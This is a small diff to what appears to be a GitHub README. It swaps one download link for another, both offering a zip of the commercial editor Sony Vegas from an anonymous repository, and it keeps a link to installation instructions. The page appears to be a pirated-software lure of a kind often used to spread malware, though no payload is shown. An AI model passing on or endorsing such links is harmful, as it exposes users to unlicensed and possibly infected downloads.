@@ -1,4 +1,4 @@
-# [DOWNLOAD](https://github.com/aknelamaep861/aknelamaep861/releases/download/latest/Sony_Vegas_Full.zip)
+# [DOWNLOAD](https://github.com/aknelamaep861/aknelamaep861/releases/download/latest/Sony.Vegas.zip)
 # [Click here to view installation instructions](https://github.com/aknelamaep861/aknelamaep861/blob/main/Installation%20instructions.txt)
 
 # License: 
